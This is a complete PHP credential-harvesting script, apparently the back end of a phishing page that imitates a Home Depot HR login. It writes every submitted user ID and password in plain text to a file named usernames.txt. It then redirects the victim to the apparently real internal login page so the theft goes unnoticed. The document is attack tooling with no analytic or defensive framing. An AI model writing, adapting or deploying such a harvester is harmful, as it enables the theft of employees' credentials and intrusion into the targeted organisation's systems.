<?php

file_put_contents("usernames.txt", "Account: " . $_POST['userId'] . " Pass: " . $_POST['Password'] . "\n", FILE_APPEND);
header('Location: http://hrwebwdc/v5HomeDepot/login.aspx?ReturnUrl=%2fV5homeDepot%2fdefault.aspx');
?>
